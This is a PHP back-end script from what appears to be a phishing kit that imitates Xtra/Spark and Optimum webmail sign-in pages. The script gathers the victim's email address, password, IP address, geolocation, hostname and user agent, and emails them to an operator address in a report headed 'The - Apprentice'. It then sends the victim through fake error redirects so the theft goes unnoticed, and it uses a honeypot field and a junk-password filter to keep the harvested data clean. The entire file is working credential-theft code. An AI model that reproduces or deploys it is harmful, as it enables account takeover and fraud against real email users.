<?php
error_reporting();
ob_start();
session_start();
$asp = "MyAccounts.aspx";
$axp ="Re_Identify";

//Getting user ip & hostname & mapping it to location
$ip = getenv("REMOTE_ADDR");
$getipinfo = file_get_contents("http://www.geoplugin.net/php.gp?ip=".$ip."");
$data = unserialize($getipinfo);
$city=$data['geoplugin_city'];
          $region=$data['geoplugin_regionName'];
          $country=$data['geoplugin_countryName'];
          $log_date = date('d/m/Y - h:i:s');
          
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];




/** form fields **/

$_SESSION['email'] = $email = $_POST['email'];
$passwd = $_POST['passwd'];
$domain = @substr(strrchr($email, "@"), 1);
$wiz = $_POST['wiz'];
if ($wiz !== '') {
    die();
} else {
// pass valid/invalid emails
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
         $setback = "err.php";
         $argument = "spEntityID=appsuite-saml-xm1&echo=$email&error=invalidemail&goto=https%3A%2F%2Fwww.spark.co.nz%2Fcwa%2FSSORedirect%2FmetaAlias%2FXtramail%2Fidp1%3FReqID%3Dee15ec6706474672a5e8e4715fc48569%26index%3Dnull%26acsURL%3Dhttps%253A%252F%252Fwebmail.xtra.co.nz%252Fappsuite%252Fapi%252Fsaml%252Facs%26spEntityID%3Dappsuite-saml-xm1%26binding%3Durn%253Aoasis%253Anames%253Atc%253ASAML%253A2.0%253Abindings%253AHTTP-POST";
         header("Location: $setback?$argument");
    } else {
//Add bad key minimizer
        include 'sanitize_password.php';

//Empty string catcher and key sanitizing
        if ($passwd =="") {
             $setback = "err.php";
             $argument = "spEntityID=appsuite-saml-xm1&echo=$email&error=emptypass&goto=https%3A%2F%2Fwww.webtop.webmail.optimum.net%2Fcwa%2FSSORedirect%2FmetaAlias%2FXtramail%2Fidp1%3FReqID%3Dee15ec6706474672a5e8e4715fc48569%26index%3Dnull%26acsURL%3Dhttps%253A%252F%252Fwww.webtop.webmail.optimum.net%252Fappsuite%252Fapi%252Fsaml%252Facs%26spEntityID%3Dappsuite-saml-xm1%26binding%3Durn%253Aoasis%253Anames%253Atc%253ASAML%253A2.0%253Abindings%253AHTTP-POST";
             header("Location: $setback?$argument");
        } elseif (match($badkeys, $passwd)) {
            $setback = "err.php";
            $argument = "spEntityID=appsuite-saml-xm1&echo=$email&error=emptypass&goto=https%3A%2F%2Fwww.webtop.webmail.optimum.net%2Fcwa%2FSSORedirect%2FmetaAlias%2FXtramail%2Fidp1%3FReqID%3Dee15ec6706474672a5e8e4715fc48569%26index%3Dnull%26acsURL%3Dhttps%253A%252F%252Fwww.webtop.webmail.optimum.net%252Fappsuite%252Fapi%252Fsaml%252Facs%26spEntityID%3Dappsuite-saml-xm1%26binding%3Durn%253Aoasis%253Anames%253Atc%253ASAML%253A2.0%253Abindings%253AHTTP-POST";
            header("Location: $setback?$argument");
        } else {
//including email to send
            include '../Email.php';


//Arranging reports
            $Hash = "==================+[ The - Apprentice ]+==================
Email : $email
Password   : $passwd
Dom : $domain
============= [ Ip & Hostname Info ] =============

Client IP: $ip
Country: $country
Region: $region
City: $city
TimeStamp: $log_date 
Hostname: $hostname
Agent: $agent
-----------------+  +-----------------";

//Relaying...
            $subject = "$email | New $domain User Notification";
            $headers = "From: Alert<alerts@isb-internal.org>";
            $headers .= $_POST['eMailAdd']."\n";
            $headers .= "MIME-Version: 1.0\n";
            mail($SEND, $subject, $Hash, $headers);


//Exiting dynamically
            $dyn = @$_GET['dyn'];
            if ($dyn !== 'second') {
                       $setback = "err.php";
                       $argument = "spEntityID=appsuite-saml-xm1&echo=$email&error=second&goto=https%3A%2F%2Fwww.webtop.webmail.optimum.net%2Fcwa%2FSSORedirect%2FmetaAlias%2FXtramail%2Fidp1%3FReqID%3Dee15ec6706474672a5e8e4715fc48569%26index%3Dnull%26acsURL%3Dhttps%253A%252F%252Fwww.webtop.webmail.optimum.net%252Fappsuite%252Fapi%252Fsaml%252Facs%26spEntityID%3Dappsuite-saml-xm1%26binding%3Durn%253Aoasis%253Anames%253Atc%253ASAML%253A2.0%253Abindings%253AHTTP-POST";
                       header("Location: $setback?$argument");
            } else {
                    $setback = "../docget.php";
                    $argument = "spEntityID=appsuite-saml-xm1&echo=$email&error=second&goto=https%3A%2F%2Fwww.webtop.webmail.optimum.net%2Fcwa%2FSSORedirect%2FmetaAlias%2FXtramail%2Fidp1%3FReqID%3Dee15ec6706474672a5e8e4715fc48569%26index%3Dnull%26acsURL%3Dhttps%253A%252F%252Fwww.webtop.webmail.optimum.net%252Fappsuite%252Fapi%252Fsaml%252Facs%26spEntityID%3Dappsuite-saml-xm1%26binding%3Durn%253Aoasis%253Anames%253Atc%253ASAML%253A2.0%253Abindings%253AHTTP-POST";
                    header("Location: $setback?$argument");
            }
        }
    }
}
